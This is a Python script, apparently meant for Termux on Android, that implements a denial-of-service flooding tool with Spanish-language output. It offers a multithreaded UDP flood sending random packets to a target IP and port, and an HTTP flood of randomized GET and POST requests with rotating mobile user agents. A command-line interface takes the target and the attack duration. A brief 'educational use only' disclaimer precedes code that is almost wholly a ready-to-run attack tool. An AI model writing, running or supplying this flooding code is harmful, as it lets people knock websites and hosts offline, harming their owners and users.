#!/usr/bin/env python3

import socket
import threading
import time
import random
import sys
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print("[!] Error: La librería 'requests' no está instalada. Instálala con: pip install requests")
    sys.exit(1)

# ADVERTENCIA: Este script está diseñado para propósitos educativos y de pruebas en entornos controlados.
# Realizar ataques DDoS sin autorización explícita es ilegal y puede violar leyes como el Computer Fraud and Abuse Act (CFAA) u otras regulaciones locales.
# Úsalo únicamente en sistemas propios o con permiso explícito del propietario.

def print_ascii_art():
    ascii_art = """
⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣧⡀⢀⣠⣤⣶⣶⣶⣶⣶⣦⣤⣀⠀⣠⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
⠀⠀⠀⣀⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⠛⢉⣿⡿⠿⢿⣦⡀
⠀⢀⣴⠏⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⠀⠉⠁⠀⠀⠀⠀⠁
⠀⣾⣿⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢿⣿⣿⣿⣷⣶⣤⣤⣴⣶⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(ascii_art)

class TermuxDDoS:
    def __init__(self):
        self.stats = {
            'packets_sent': 0,
            'errors': 0,
            'start_time': time.time()
        }
        self.running = True

    def simple_udp_flood(self, target_ip, target_port, duration, threads=50):
        print(f"[TERMUX] UDP Flood -> {target_ip}:{target_port}")
        print(f"[*] Duración: {duration}s | Hilos: {threads}")

        def udp_worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = random._urandom(512)
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats['packets_sent'] += 1
                    sock.close()
                except Exception as e:
                    self.stats['errors'] += 1
                    print(f"[!] Error en UDP worker: {e}")

        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(udp_worker)

        print(f"\n[+] Ataque UDP completado")
        self.print_final_stats()

    def http_flood_termux(self, target_url, duration, threads=30):
        print(f"[TERMUX] HTTP Flood -> {target_url}")

        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36',
            'Mozilla/5.0 (Android; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0'
        ]

        def http_worker():
            session = requests.Session()
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }

                    if random.choice([True, False]):
                        session.get(target_url, headers=headers, timeout=5)
                    else:
                        session.post(target_url, data={'data': 'test'}, headers=headers, timeout=5)

                    self.stats['packets_sent'] += 1
                except Exception as e:
                    self.stats['errors'] += 1
                    print(f"[!] Error en HTTP worker: {e}")

        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(http_worker)

        print(f"\n[+] Ataque HTTP completado")
        self.print_final_stats()

    def show_stats(self):
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                pps = self.stats['packets_sent'] / elapsed
                print(f"\r[STATS] Paquetes: {self.stats['packets_sent']} | PPS: {pps:.1f} | Errores: {self.stats['errors']}", end="")
            time.sleep(1)

    def print_final_stats(self):
        total_time = time.time() - self.stats['start_time']
        pps = self.stats['packets_sent'] / total_time if total_time > 0 else 0

        print(f"\n[ESTADÍSTICAS FINALES]")
        print(f"  Paquetes totales: {self.stats['packets_sent']}")
        print(f"  Errores: {self.stats['errors']}")
        print(f"  Duración: {total_time:.1f}s")
        print(f"  Paquetes/seg: {pps:.1f}")

    def stop(self):
        self.running = False

def main():
    print_ascii_art()  # Imprimir el arte ASCII al inicio
    if len(sys.argv) < 4:
        print("Uso: python3 termux_ddos.py <IP/URL> <PUERTO> <TIEMPO> [MÉTODO]")
        print("Métodos: udp, http")
        print("Ejemplos:")
        print("  python3 termux_ddos.py 192.168.1.101 80 30 udp")
        print("  python3 termux_ddos.py http://192.168.1.101 0 30 http")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    method = sys.argv[4].lower() if len(sys.argv) > 4 else "udp"

    ddos = TermuxDDoS()

    try:
        if method == "udp":
            ddos.simple_udp_flood(target, port, duration, threads=50)
        elif method == "http":
            if not target.startswith(('http://', 'https://')):
                target = f'http://{target}'
            ddos.http_flood_termux(target, duration, threads=30)
        else:
            print("[!] Método no válido. Usa: udp, http")
            sys.exit(1)

    except KeyboardInterrupt:
        ddos.stop()
        print("\n[!] Detenido por el usuario")
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
        ddos.stop()

if __name__ == "__main__":
    main()